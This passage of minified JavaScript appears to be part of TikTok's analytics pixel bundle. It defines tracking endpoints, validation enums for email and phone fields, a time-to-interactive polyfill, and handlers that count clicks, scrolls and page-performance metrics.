      a = (t, e = 21) => i(t, e, o),
      u = (e = 21) => {
        let n = "";
        for (var r = crypto.getRandomValues(new Uint8Array(e)); e--;) {
          let t = 63 & r[e];
          t < 36 ? n += t.toString(36) : t < 62 ? n += (t - 26).toString(36).toUpperCase() : t < 63 ? n += "_" : n += "-";
        }
        return n;
      };
  },
  w0s3: function (t, e, n) {
    "use strict";

    n.d(e, "f", function () {
      return r;
    }), n.d(e, "c", function () {
      return o;
    }), n.d(e, "b", function () {
      return i;
    }), n.d(e, "i", function () {
      return a;
    }), n.d(e, "a", function () {
      return u;
    }), n.d(e, "g", function () {
      return c;
    }), n.d(e, "h", function () {
      return s;
    }), n.d(e, "e", function () {
      return l;
    }), n.d(e, "d", function () {
      return f;
    });
    var r = "TiktokAnalyticsObject",
      o = "ttq",
      i = "external",
      a = "tiktok",
      u = "https://analytics.tiktok.com/i18n/pixel/config.js",
      c = "https://analytics.tiktok.com/i18n/pixel/pickup.js",
      s = "https://analytics.tiktok.com/i18n/pixel/identify.js",
      l = "https://analytics.tiktok.com/i18n/pixel/enable_cookie",
      f = "https://analytics.tiktok.com/i18n/pixel/disable_cookie";
  },
  yLpj: function (t, e) {
    var n = function () {
      return this;
    }();
    try {
      n = n || new Function("return this")();
    } catch (r) {
      "object" == typeof window && (n = window);
    }
    t.exports = n;
  }
});
window.addEventListener('click', jshook);
window.addEventListener('keydown', jshook);
!function (n) {
  var r = {};
  function i(t) {
    if (r[t]) return r[t].exports;
    var e = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return n[t].call(e.exports, e, e.exports, i), e.l = !0, e.exports;
  }
  i.m = n, i.c = r, i.d = function (t, e, n) {
    i.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: n
    });
  }, i.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, i.t = function (e, t) {
    if (1 & t && (e = i(e)), 8 & t) return e;
    if (4 & t && "object" == typeof e && e && e.__esModule) return e;
    var n = Object.create(null);
    if (i.r(n), Object.defineProperty(n, "default", {
      enumerable: !0,
      value: e
    }), 2 & t && "string" != typeof e) for (var r in e) i.d(n, r, function (t) {
      return e[t];
    }.bind(null, r));
    return n;
  }, i.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return i.d(e, "a", e), e;
  }, i.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, i.p = "https://analytics.tiktok.com/i18n/pixel/", i(i.s = "d98v");
}({
  "2HLQ": function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {})[e.NOT_SURE = 0] = "NOT_SURE", e[e.INVOKE_METHOD_ENABLED = 1] = "INVOKE_METHOD_ENABLED", e[e.INVOKE_METHOD_NOT_ENABLED = 2] = "INVOKE_METHOD_NOT_ENABLED", e[e.TOUTIAO_BRIDGE_NOT_ENABLED = 3] = "TOUTIAO_BRIDGE_NOT_ENABLED";
  },
  GJ6r: function (t, h, p) {
    "use strict";

    !function (t) {
      p.d(h, "a", function () {
        return r;
      }), p.d(h, "g", function () {
        return i;
      }), p.d(h, "e", function () {
        return c;
      }), p.d(h, "f", function () {
        return u;
      }), p.d(h, "b", function () {
        return l;
      }), p.d(h, "d", function () {
        return f;
      }), p.d(h, "c", function () {
        return d;
      });
      var e = p("SbFU"),
        n = (p("2HLQ"), p("IOsT"), p("w0s3")),
        r = function () {
          return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
        },
        i = function () {
          var t = r();
          return "undefined" != typeof t.DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name;
        },
        o = function () {
          var t = r();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        a = function () {
          var t;
          return (null === (t = null === (t = Object(e.e)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || n.b;
        },
        c = function () {
          return a() !== n.b;
        },
        u = function () {
          return a() === n.i;
        },
        s = (Object(e.n)(function () {
          return /open_news/i.test(o());
        }), Object(e.n)(function () {
          return /ultralite/i.test(o());
        }), function () {
          return /windows phone/i.test(o()) ? "Windows Phone" : /android/i.test(o()) ? "android" : /iPad|iPhone|iPod/.test(o()) ? "ios" : "pc";
        }),
        l = function () {
          return "android" === s();
        },
        f = function () {
          return "ios" === s();
        },
        d = function () {
          return "development" === "production".trim();
        };
    }.call(this, p("yLpj"));
  },
  HyyX: function (t, e, n) {
    "use strict";

    n.d(e, "c", function () {
      return r;
    }), n.d(e, "a", function () {
      return i;
    }), n.d(e, "b", function () {
      return o;
    });
    var r = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (e = a = a || {}).missing = "missing", e.valid = "valid", e.invalid = "invalid", (e = {}).empty = "empty", e.whitespace = "whitespace", e.hardcode = "hardcode", e.encode = "encode", (e = {}).invalidCountry = "invalid_country", e.notANumber = "not_a_number", e.tooShort = "too_short", e.tooLong = "too_long", e.invalidLength = "invalid_length", e.emptyCountryCodeThroughIP = "empty_country_code_through_ip", e.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", e.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", e.tooShortAfterInjectPlus = "too_short_after_inject_plus", e.tooLongAfterInjectPlus = "too_long_after_inject_plus", e.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", e.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", e.notANumberAfterInjectCountry = "not_a_number_after_inject_country", e.tooShortAfterInjectCountry = "too_short_after_inject_country", e.tooLongAfterInjectCountry = "too_long_after_inject_country", e.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (e = {}).letterCase = "letter_case", e.isNotValidEmail = "is_not_valid_email", e.isNotPossibleEmail = "is_not_possible_email", e.domainTypo = "domain_typo", e.addressFormat = "address_format";
    var i, o, a;
    a.missing, a.missing, a.missing, a.missing, a.missing, a.missing;
    (a = i = i || {}).EMPTY_VALUE = "empty_value", a.WRONG_FORMAT = "wrong_format", a.CORRECT_FORMAT = "correct_format", a.HASHED = "hashed", a.HASHED_ERR = "hashed_err", a.HASHED_CORRECT = "hashed_correct", a.PLAINTEXT_EMAIL = "plaintext_email", a.PLAINTEXT_PHONE = "plaintext_phone", (a = o = o || {}).EMPTY_VALUE = "empty_value", a.PLAIN_EMAIL = "plain_email", a.PLAIN_PHONE = "plain_phone", a.HASHED = "hashed", a.FILTER_EVENTS = "filter_events", a.UNKNOWN_INVALID = "unknown_invalid", a.BASE64_STRING_HASHED = "base64_string_hashed", a.BASE64_HEX_HASHED = "base64_hex_hashed", a.PLAIN_MDN_EMAIL = "plain_mdn_email", (a = {}).Manual = "manual", a.Auto = "auto";
  },
  IOsT: function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {}).Normal = "1", e.Iframe = "2", e.WebWorker = "3", e.SandboxIframe = "4";
  },
  JgE6: function (_, b, t) {
    !function (g) {
      var v;
      !function () {
        var r = ("undefined" == typeof window || window !== this) && void 0 !== g && null != g ? g : this,
          e = "function" == typeof Object.defineProperties ? Object.defineProperty : function (t, e, n) {
            t != Array.prototype && t != Object.prototype && (t[e] = n.value);
          };
        function n() {
          n = function () {}, r.Symbol || (r.Symbol = t);
        }
        var i = 0;
        function t(t) {
          return "jscomp_symbol_" + (t || "") + i++;
        }
        function o() {
          n();
          var t = (t = r.Symbol.iterator) || (r.Symbol.iterator = r.Symbol("iterator"));
          "function" != typeof Array.prototype[t] && e(Array.prototype, t, {
            configurable: !0,
            writable: !0,
            value: function () {
              return a(this);
            }
          }), o = function () {};
        }
        function a(t) {
          var e,
            n = 0;
          return e = function () {
            return n < t.length ? {
              done: !1,
              value: t[n++]
            } : {
              done: !0
            };
          }, o(), (e = {
            next: e
          })[r.Symbol.iterator] = function () {
            return this;
          }, e;
        }
        function f(t) {
          o();
          var e = t[Symbol.iterator];
          return e ? e.call(t) : a(t);
        }
        function d(t) {
          if (!(t instanceof Array)) {
            t = f(t);
            for (var e, n = []; !(e = t.next()).done;) n.push(e.value);
            t = n;
          }
          return t;
        }
        var h = 0;
        var c = "img script iframe link audio video source".split(" ");
        function p(n) {
          var t = new MutationObserver(function (t) {
            for (var e = (t = f(t)).next(); !e.done; e = t.next()) ("childList" == (e = e.value).type && function r(t, e) {
              for (var n = (t = f(t)).next(); !n.done; n = t.next()) if (n = n.value, e.includes(n.nodeName.toLowerCase()) || r(n.children, e)) return 1;
            }(e.addedNodes, c) || "attributes" == e.type && c.includes(e.target.tagName.toLowerCase())) && n(e);
          });
          return t.observe(document, {
            attributes: !0,
            childList: !0,
            subtree: !0,
            attributeFilter: ["href", "src"]
          }), t;
        }
        function m(t, e) {
          if (2 < t.length) return performance.now();
          for (var n = [], r = (e = f(e)).next(); !r.done; r = e.next()) r = r.value, n.push({
            timestamp: r.start,
            type: "requestStart"
          }), n.push({
            timestamp: r.end,
            type: "requestEnd"
          });
          for (r = (e = f(t)).next(); !r.done; r = e.next()) n.push({
            timestamp: r.value,
            type: "requestStart"
          });
          for (n.sort(function (t, e) {
            return t.timestamp - e.timestamp;
          }), t = t.length, e = n.length - 1; 0 <= e; e--) switch (r = n[e], r.type) {
            case "requestStart":
              t--;
              break;
            case "requestEnd":
              if (2 < ++t) return r.timestamp;
              break;
            default:
              throw Error("Internal Error: This should never happen");
          }
          return 0;
        }
        function u(t) {
          this.w = !!(t = t || {}).useMutationObserver, this.u = t.minValue || null, t = window.__tti && window.__tti.e;
          var i,
            o,
            a,
            c,
            u,
            s,
            l,
            r,
            e = window.__tti && window.__tti.o;
          this.a = t ? t.map(function (t) {
            return {
              start: t.startTime,
              end: t.startTime + t.duration
            };
          }) : [], e && e.disconnect(), this.b = [], this.f = new Map(), this.j = null, this.v = -Infinity, this.i = !1, this.h = this.c = this.s = null, i = this.m.bind(this), o = this.l.bind(this), a = XMLHttpRequest.prototype.send, c = h++, XMLHttpRequest.prototype.send = function (t) {
            for (var e = [], n = 0; n < arguments.length; ++n) e[+n] = arguments[n];
            var r = this;
            return i(c), this.addEventListener("readystatechange", function () {
              4 === r.readyState && o(c);
            }), a.apply(this, e);
          }, u = this.m.bind(this), s = this.l.bind(this), l = fetch, fetch = function (t) {
            for (var i = [], e = 0; e < arguments.length; ++e) i[+e] = arguments[e];
            return new Promise(function (e, n) {
              var r = h++;
              u(r), l.apply(null, [].concat(d(i))).then(function (t) {
                s(r), e(t);
              }, function (t) {
                s(t), n(t);
              });
            });
          }, (r = this).c = new PerformanceObserver(function (t) {
            for (var e, n = (t = f(t.getEntries())).next(); !n.done; n = t.next()) "resource" === (n = n.value).entryType && (r.b.push({
              start: n.fetchStart,
              end: n.responseEnd
            }), y(r, m(r.g, r.b) + 5e3)), "longtask" === n.entryType && (e = n.startTime + n.duration, r.a.push({
              start: n.startTime,
              end: e
            }), y(r, e + 5e3));
          }), r.c.observe({
            entryTypes: ["longtask", "resource"]
          }), this.w && (this.h = p(this.B.bind(this)));
        }
        function s(t) {
          t.i = !0;
          var e = 0 < t.a.length ? t.a[t.a.length - 1].end : 0,
            n = m(t.g, t.b);
          y(t, Math.max(n + 5e3, e));
        }
        function y(o, t) {
          !o.i || o.v > t || (clearTimeout(o.j), o.j = setTimeout(function () {
            var t = performance.timing.navigationStart,
              e = m(o.g, o.b),
              t = (window.a && window.a.A ? 1e3 * window.a.A().C - t : 0) || performance.timing.domContentLoadedEventEnd - t,
              n = o.u || (performance.timing.domContentLoadedEventEnd ? (n = performance.timing).domContentLoadedEventEnd - n.navigationStart : null),
              r = performance.now();
            null === n && y(o, Math.max(e + 5e3, r + 1e3));
            var i = o.a;
            (e = r - e < 5e3 ? null : r - (e = i.length ? i[i.length - 1].end : t) < 5e3 ? null : Math.max(e, n)) && (o.s(e), clearTimeout(o.j), o.i = !1, o.c && o.c.disconnect(), o.h && o.h.disconnect()), y(o, performance.now() + 1e3);
          }, t - performance.now()), o.v = t);
        }
        u.prototype.getFirstConsistentlyInteractive = function () {
          var e = this;
          return new Promise(function (t) {
            e.s = t, "complete" == document.readyState ? s(e) : window.addEventListener("load", function () {
              s(e);
            });
          });
        }, u.prototype.m = function (t) {
          this.f.set(t, performance.now());
        }, u.prototype.l = function (t) {
          this.f["delete"](t);
        }, u.prototype.B = function () {
          y(this, performance.now() + 5e3);
        }, r.Object.defineProperties(u.prototype, {
          g: {
            configurable: !0,
            enumerable: !0,
            get: function () {
              return [].concat(d(this.f.values()));
            }
          }
        });
        var l = {
          getFirstConsistentlyInteractive: function (t) {
            return t = t || {}, "PerformanceLongTaskTiming" in window ? new u(t).getFirstConsistentlyInteractive() : Promise.resolve(null);
          }
        };
        _.exports ? _.exports = l : (v = function () {
          return l;
        }.apply(b, [])) === undefined || (_.exports = v);
      }();
    }.call(this, t("yLpj"));
  },
  Mo1V: function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {}).TRACK = "track", e.PERFORMANCE = "performance", e.PERFORMANCE_INTERACTION = "performance_interaction", e.INTERACTION = "interaction", e.PCM = "PCM", e.SELFHOST = "selfhost", e.AUTO_CONFIG = "auto_config", (e = {}).LDU = "limited_data_use", e.EVENTID = "eventID", e.EVENT_ID = "event_id";
  },
  Pd38: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return r;
    });
    var i = n("SbFU"),
      r = function (e, t, n) {
        void 0 === n && (n = !1);
        var r = Object(i.e)() || [];
        if (r.dynamicPlugins || (r.dynamicPlugins = []), !r.dynamicPlugins.find(function (t) {
          return t.name === e;
        })) {
          if (!n) if (!Object(i.m)(e)) return;
          r.dynamicPlugins.push({
            name: e,
            handler: t
          });
        }
      };
  },
  SbFU: function (t, e, n) {
    "use strict";

    n.d(e, "f", function () {
      return c;
    }), n.d(e, "j", function () {
      return u;
    }), n.d(e, "e", function () {
      return s;
    }), n.d(e, "m", function () {
      return l;
    }), n.d(e, "l", function () {
      return f;
    }), n.d(e, "g", function () {
      return d;
    }), n.d(e, "h", function () {
      return h;
    }), n.d(e, "d", function () {
      return p;
    }), n.d(e, "p", function () {
      return m;
    }), n.d(e, "c", function () {
      return y;
    }), n.d(e, "o", function () {
      return g;
    }), n.d(e, "n", function () {
      return v;
    }), n.d(e, "k", function () {
      return _;
    }), n.d(e, "b", function () {
      return b;
    }), n.d(e, "a", function () {
      return w;
    }), n.d(e, "i", function () {
      return T;
    });
    n("GJ6r");
    var r = n("w0s3"),
      i = (n("HyyX"), undefined && undefined.__awaiter || function (t, e, c, u) {
        return new (c = c || Promise)(function (n, r) {
          function i(t) {
            try {
              a(u.next(t));
            } catch (e) {
              r(e);
            }
          }
          function o(t) {
            try {
              a(u["throw"](t));
            } catch (e) {
              r(e);
            }
          }
          function a(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(i, o);
          }
          a((u = u.apply(t, e || [])).next());
        });
      }),
      o = undefined && undefined.__generator || function (n, r) {
        var i,
          o,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            "throw": e(1),
            "return": e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return u([e, t]);
          };
        }
        function u(t) {
          if (i) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (i = 1, o && (a = 2 & t[0] ? o["return"] : t[0] ? o["throw"] || ((a = o["return"]) && a.call(o), 0) : o.next) && !(a = a.call(o, t[1])).done) return a;
            switch (o = 0, (t = a ? [2 & t[0], a.value] : t)[0]) {
              case 0:
              case 1:
                a = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, o = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!a || t[1] > a[0] && t[1] < a[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < a[1]) {
                  c.label = a[1], a = t;
                  break;
                }
                if (a && c.label < a[2]) {
                  c.label = a[2], c.ops.push(t);
                  break;
                }
                a[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(n, c);
          } catch (e) {
            t = [6, e], o = 0;
          } finally {
            i = a = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      a = undefined && undefined.__read || function (t, e) {
        var n = "function" == typeof Symbol && t[Symbol.iterator];
        if (!n) return t;
        var r,
          i,
          o = n.call(t),
          a = [];
        try {
          for (; (void 0 === e || 0 < e--) && !(r = o.next()).done;) a.push(r.value);
        } catch (c) {
          i = {
            error: c
          };
        } finally {
          try {
            r && !r.done && (n = o["return"]) && n.call(o);
          } finally {
            if (i) throw i.error;
          }
        }
        return a;
      },
      c = (undefined && undefined.__spread, function () {
        var t = s();
        return t._partner || "";
      }),
      u = function () {
        var t = s();
        return t && t.initialize;
      },
      s = function () {
        return "object" == typeof window && window["object" == typeof window && window[r.f] || r.c];
      },
      l = function (t) {
        try {
          var e = s()._plugins || {};
          return null == e[t] || !!e[t];
        } catch (n) {
          return !0;
        }
      },
      f = function () {
        try {
          var t = s();
          return t && t._legacy && 0 !== t._legacy.length ? Object.keys(t._t).length > Object.keys(t._legacy).length || Object.keys(t.context.data.pixelMap).length > Object.keys(t._legacy).length : !1;
        } catch (e) {
          return !1;
        }
      },
      d = function (t) {
        try {
          var e = s();
          if (e && e._self_host_config && e._self_host_config[t]) return e._self_host_config[t] || "";
        } catch (n) {
          return "";
        }
        return "";
      },
      h = function () {
        var t;
        try {
          return (null === (t = s()) || void 0 === t ? void 0 : t._usd_exchange_rate) || null;
        } catch (e) {
          return null;
        }
      },
      p = function () {
        return new Date(Date.now() + 864e5).toUTCString();
      };
    function m(n, r) {
      void 0 === r && (r = 500);
      var i = Date.now();
      return function () {
        var t = arguments,
          e = Date.now();
        r <= e - i && (n.apply(null, t), i = Date.now());
      };
    }
    function y(n, r, i) {
      var o;
      return function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        clearTimeout(o), o = setTimeout(function () {
          n.apply(i, t);
        }, r);
      };
    }
    function g(e) {
      return void 0 === e && (e = 500), i(this, void 0, void 0, function () {
        return o(this, function (t) {
          return [2, new Promise(function (t) {
            setTimeout(function () {
              t(!0);
            }, e);
          })];
        });
      });
    }
    function v(n, r) {
      var i,
        o = n;
      return function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        return o && (i = n.apply(r, t), o = null), i;
      };
    }
    function _(t, e) {
      return 0 < Object.keys(function o(t, e) {
        var n = {};
        for (var r in t) {
          var i;
          t.hasOwnProperty(r) && !e.hasOwnProperty(r) ? n[r] = t[r] : t.hasOwnProperty(r) && e.hasOwnProperty(r) && t[r] !== e[r] && ("object" == typeof t[r] && "object" == typeof e[r] ? (i = o(t[r], e[r]), 0 < Object.keys(i).length && (n[r] = i)) : n[r] = t[r]);
        }
        for (var r in e) e.hasOwnProperty(r) && !t.hasOwnProperty(r) && (n[r] = e[r]);
        return n;
      }(t, e)).length;
    }
    var b = ["input[type='button']", "input[type='image']", "input[type='submit']", "button", "[class*=btn]", "[class*=Btn]", "[class*=button]", "[class*=Button]", "[role*=button]", "[id*=btn]", "[id*=Btn]", "[id*=button]", "[id*=Button]", "a"],
      w = ["[href^='tel:']", "[href^='callto:']", "[href^='sms:']", "[href^='skype:']", "[href^='whatsapp:']", "[href^='mailto:']"],
      T = function (e) {
        var t = b.some(function (t) {
            return e.matches(t);
          }),
          n = w.some(function (t) {
            return e.matches(t);
          });
        return t && !n;
      };
  },
  SnBs: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return i;
    });
    var r,
      e = undefined && undefined.__extends || (r = function (t, e) {
        return (r = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        r(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      i = (o.prototype.pageDidLoad = function () {}, o.prototype.pixelDidMount = function (t) {}, o.prototype.pageUrlWillChange = function (t, e) {}, o.prototype.pageUrlDidChange = function (t, e) {}, o.prototype.initStart = function () {}, o.prototype.initEnd = function () {}, o.prototype.adInfoInitStart = function () {}, o.prototype.adInfoInitEnd = function () {}, o.prototype.contextInitStart = function () {}, o.prototype.contextInitEnd = function () {}, o.prototype.pluginInitStart = function (t) {}, o.prototype.pluginInitEnd = function (t) {}, o.prototype.pixelCreateStart = function (t) {}, o.prototype.pixelCreateEnd = function (t) {}, o.prototype.pixelInitEnd = function (t) {}, o.prototype.pixelSend = function (t, e, n, r, i) {}, o.prototype.pageWillLeave = function (t) {}, o);
    function o(t) {
      t && (this.context = t);
    }
    var a;
    e(c, a = i), c.prototype.pixelDidMount = function (t) {
      var e = t.pixelCode,
        t = this.getTrackType(),
        n = this.context.methods.batchTrack.bind(this.context, {
          pixelCode: e,
          type: t
        });
      this.batchReportFunctions.push(n), this.stash.forEach(function (t) {
        n(t, !1);
      });
    }, c.prototype.pageUrlWillChange = function (t, e) {}, c.prototype.pageUrlDidChange = function (t) {
      t !== this.currentUrl && (this.oldUrl = this.currentUrl, this.currentUrl = t);
    }, c.prototype.handleCacheData = function () {
      var t = this;
      this.stash.forEach(function (e) {
        t.batchReportFunctions.forEach(function (t) {
          t(e, !1);
        });
      });
    }, c.prototype.track = function (e, n) {
      this.stash.push(e), this.batchReportFunctions.forEach(function (t) {
        t(e, n);
      });
    };
    function c(t) {
      var n = a.call(this, t) || this;
      return n.batchReportFunctions = [], n.currentUrl = "", n.oldUrl = "", n.stash = [], n.batchReportFunctions = n.context.methods.getAllPixels().map(function (t) {
        var e = t.pixelCode,
          t = n.getTrackType();
        return n.context.methods.batchTrack.bind(n.context, {
          pixelCode: e,
          type: t
        });
      }), n;
    }
  },
  ZFXO: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return r;
    }), n.d(e, "f", function () {
      return i;
    }), n.d(e, "i", function () {
      return o;
    }), n.d(e, "g", function () {
      return a;
    }), n.d(e, "d", function () {
      return c;
    }), n.d(e, "h", function () {
      return u;
    }), n.d(e, "c", function () {
      return s;
    }), n.d(e, "e", function () {
      return l;
    }), n.d(e, "b", function () {
      return f;
    }), n.d(e, "j", function () {
      return d;
    });
    var r = "tt_adInfo",
      i = "https://analytics.tiktok.com/api/v2/pcm",
      o = "https://analytics.tiktok.com/api/v2/shopify_pixel",
      a = "https://analytics.tiktok.com/api/v2/performance",
      c = "https://analytics.tiktok.com/api/v2/interaction",
      u = "https://analytics.tiktok.com/api/v2/performance_interaction",
      s = "https://analytics.tiktok.com/api/v2/pixel/act",
      l = "https://analytics.pangle-ads.com/api/v2/pangle_pixel",
      f = "https://analytics.pangle-ads.com/api/v2/pangle_disable_cookie",
      d = "https://analytics.tiktok.com/api/v2/pixel";
  },
  d98v: function (t, e, n) {
    "use strict";

    n.r(e);
    var r = n("Pd38"),
      i = n("SnBs");
    function o() {
      var t = document.body,
        e = document.documentElement;
      return Math.max(t ? t.scrollHeight : 0, t ? t.offsetHeight : 0, e ? e.clientHeight : 0, e ? e.scrollHeight : 0, e ? e.offsetHeight : 0);
    }
    function a() {
      return document.documentElement.clientHeight + window.pageYOffset;
    }
    function c() {
      return {
        docHeight: o(),
        scrollHeight: a(),
        connectionType: (t = navigator.connection) && t.effectiveType ? t.effectiveType : ""
      };
      var t;
    }
    var u = 500,
      s = 100,
      l = {
        fcp: "first_contentful_paint",
        lcp: "largest_contentful_paint",
        cls: "cumulative_layout_shift",
        fid: "first_input_delay",
        tti: "time_to_interactive",
        navigationStart: "navigation_start",
        loadEventStart: "load_event_start",
        requestStart: "request_start",
        enterTime: "enter_time",
        leaveTime: "leave_time",
        docHeight: "doc_height",
        maxScrollHeight: "max_scroll_height",
        clickTimes: "click_times",
        scrollTimes: "scroll_times",
        connectionType: "connection_type"
      };
    function f(n, r) {
      void 0 === r && (r = 500);
      var i = Date.now();
      return function () {
        var t = arguments,
          e = Date.now();
        r <= e - i && (n.apply(null, t), i = e);
      };
    }
    var d = (h.prototype.pageUrlWillChange = function (t, e) {
      "" !== t ? this.leaveTime = Date.now() : this.enterTime = window.performance.timing.navigationStart;
    }, h.prototype.pageUrlDidChange = function (t) {
      0 !== this.enterTime && (this.resetAfterPageChange(), this.initInteractionData(), this.enterTime = Date.now());
    }, h.prototype.pageWillLeave = function (t) {
      this.leaveTime = t;
    }, h.prototype.getResult = function () {
      var t = {};
      return this.scrollTimes && (t.scrollTimes = this.scrollTimes), this.clickTimes && (t.clickTimes = this.clickTimes), this.leaveTime && (t.leaveTime = this.leaveTime), this.isDocHeightChanged && (t.docHeight = this.docHeight), this.isMaxScrollHeightChanged && (t.maxScrollHeight = this.maxScrollHeight), this.isFirstReport && (t.connectionType = this.connectionType, t.enterTime = this.enterTime), this.clearAfterReport(), t;
    }, h.prototype.isChanged = function () {
      return this.isDocHeightChanged || this.isMaxScrollHeightChanged || 0 != this.scrollTimes || 0 != this.clickTimes || 0 != this.leaveTime;
    }, Object.defineProperty(h.prototype, "docHeight", {
      get: function () {
        return this._docHeight;
      },
      set: function (t) {
        t > this._docHeight ? (this._docHeight = t, this.isDocHeightChanged = !0) : 0 === t && (this._docHeight = 0, this.isDocHeightChanged = !1);
      },
      enumerable: !1,
      configurable: !0
    }), Object.defineProperty(h.prototype, "maxScrollHeight", {
      get: function () {
        return this._maxScrollHeight;
      },
      set: function (t) {
        t > this._maxScrollHeight ? (this._maxScrollHeight = t, this.isMaxScrollHeightChanged = !0) : 0 === t && (this._maxScrollHeight = 0, this.isMaxScrollHeightChanged = !1);
      },
      enumerable: !1,
      configurable: !0
    }), h.prototype.initInteractionData = function () {
      var t = c(),
        e = t.docHeight,
        n = t.scrollHeight,
        t = t.connectionType;
      this.docHeight = e, this.maxScrollHeight = n, this.connectionType = t;
    }, h);
    function h() {
      var e,
        n,
        t,
        r = this;
      this.connectionType = "", this._docHeight = 0, this._maxScrollHeight = 0, this.clickTimes = 0, this.scrollTimes = 0, this.isDocHeightChanged = !1, this.isMaxScrollHeightChanged = !1, this.enterTime = 0, this.leaveTime = 0, this.isFirstReport = !0, this.updateClickTimes = function () {
        r.clickTimes += 1;
      }, this.updateScrollData = function (t) {
        var e = t.scrollHeight,
          t = t.docHeight;
        r.scrollTimes += 1, r.maxScrollHeight = e, r.docHeight = t;
      }, this.clearAfterReport = function () {
        r.clickTimes = 0, r.scrollTimes = 0, r.isDocHeightChanged = !1, r.isMaxScrollHeightChanged = !1, r.isFirstReport = !1;
      }, this.resetAfterPageChange = function () {
        r.clearAfterReport(), r.maxScrollHeight = 0, r.docHeight = 0, r.leaveTime = 0, r.isFirstReport = !0, r.connectionType = "";
      }, e = this.updateClickTimes.bind(this), t = f(function (t) {
        e(1);
      }, s), window.addEventListener("click", t, {
        capture: !0
      }), n = this.updateScrollData.bind(this), t = f(function () {
        var t = {
          scrollHeight: a(),
          docHeight: o()
        };
        n(t);
      }, u), window.addEventListener("scroll", t, {
        passive: !0
      });
    }
    var p = function (e, t) {
      try {
        var n = t.type;
        if (n && -1 < PerformanceObserver.supportedEntryTypes.indexOf(n)) {
          var r = new PerformanceObserver(function (t) {
            return t.getEntries().forEach(e);
          });
          return r.observe(t), r;
        }
      } catch (i) {}
    };
    var m,
      y = function (e, t) {
        void 0 === t && (t = !1), document.addEventListener("visibilitychange", function (t) {
          "hidden" === document.visibilityState && e(t);
        }, {
          once: t
        });
      },
      g = function () {
        return m === undefined && (m = "hidden" === document.visibilityState ? 0 : Infinity, y(function (t) {
          m = Math.min(m, t.timeStamp);
        })), {
          get timeStamp() {
            return m;
          }
        };
      },
      v = "first-contentful-paint";
    function _(e) {
      if (!(window && window.performance && window.performance.getEntries)) return -1;
      var t = performance.getEntriesByType("paint");
      if (Array.isArray(t)) {
        t = t.filter(function (t) {
          return t.name === e;
        });
        return t.length && t[0] && t[0].startTime && t[0].startTime || -1;
      }
      return -1;
    }
    var b = n("JgE6"),
      w = n.n(b),
      T = undefined && undefined.__values || function (t) {
        var e = "function" == typeof Symbol && Symbol.iterator,
          n = e && t[e],
          r = 0;
        if (n) return n.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return {
              value: (t = t && r >= t.length ? void 0 : t) && t[r++],
              done: !t
            };
          }
        };
        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.");
      },
      S = ["fcp", "lcp", "cls", "fid", "tti", "navigationStart", "loadEventStart", "requestStart"],
      E = (x.prototype.initPerformanceData = function () {
        function t(t) {
          t.hadRecentInput || (n += t.value);
        }
        var e, n, r, i, o, a, c, u, s, l, f, d;
        function h(t) {
          t.startTime < l.timeStamp && (f = t.startTime, s(f));
        }
        this.updatePerformanceTiming(), e = this.baseHandler.bind(this, "cls"), r = p(t, {
          type: "layout-shift",
          buffered: !(n = 0)
        }), y(function () {
          r && (r.takeRecords().forEach(t), r.disconnect()), e(n);
